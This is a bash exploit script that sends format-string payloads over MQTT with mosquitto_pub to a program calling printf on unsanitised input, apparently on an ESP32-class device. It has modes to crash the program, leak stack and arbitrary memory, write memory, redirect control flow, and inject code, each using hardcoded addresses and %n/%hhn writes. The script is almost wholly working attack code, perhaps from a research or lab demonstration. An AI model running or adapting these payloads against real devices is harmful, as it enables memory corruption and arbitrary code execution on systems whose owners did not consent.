# The format string attack exists in the printf() function.
# The call is: printf(buf)
# buf is loaded into register A10.
# Registers A11 - A15 (and the stack) are used for incoming arguments.

command_prefix="mosquitto_pub -h localhost -p 1883 -t /topic/qos0 -m"

tag_addr="ec2f403f"
write_addr="5098fc3f5198fc3f5298fc3f5398fc3f"
ret_addr="607efc3f617efc3f627efc3f"
hijack_addr="04010840080108400c010840"

nl_bin=$(echo "0a0d" | xxd -p -r)

tag_addr_bin=$(echo $tag_addr | xxd -p -r)
write_addr_bin=$(echo $write_addr | xxd -p -r)
ret_addr_bin=$(echo $ret_addr | xxd -p -r)
hijack_addr_bin=$(echo $hijack_addr | xxd -p -r)

if [[ $1 == "crash" ]]; then
    $command_prefix "CRASHING THE PROGRAM:"
    $command_prefix "%s %s %s %s %s %s %s %s %s %s"
elif [[ $1 == "readstack" ]]; then
    # Reading the stack
    $command_prefix "READING THE STACK:"
    $command_prefix "$nl_bin \
        Registers A11 - A15: %x %x %x %x %x $nl_bin \
        Stack frame: %x %x %x %x %x"
elif [[ $1 == "readmem" ]]; then
    # Reading arbitrary memory
    $command_prefix "READING ARBITRARY MEMORY:"
    $command_prefix "$tag_addr_bin %6\$s"
elif [[ $1 = "writemem" ]]; then
    # Writing arbitrary memory
    $command_prefix "WRITING ARBITRARY MEMORY:"
    $command_prefix "$write_addr_bin%49x%6\$hhn %7\$hhn %8\$hhn %9\$n $nl_bin %6\$s"
elif [[ $1 == "hijack" ]]; then
    # Control flow hijack to address 0x4008e37c = abort()
    $command_prefix "CONTROL FLOW HIJACK:"
    $command_prefix "$ret_addr_bin%112x%6\$hhn%103x%7\$hhn%37x%8\$hhn"
elif [[ $1 == "inject" ]]; then
    # Code injection
    $command_prefix "CODE INJECTION:"
    $command_prefix "$hijack_addr_bin$ret_addr_bin\
%233x%10\$hhn\
%259x%9\$hhn\
%260x%11\$hhn\
%60693x%8\$n\
%809471x%7\$n\
%41216x%6\$n"
else
    echo "I don't know that command"
fi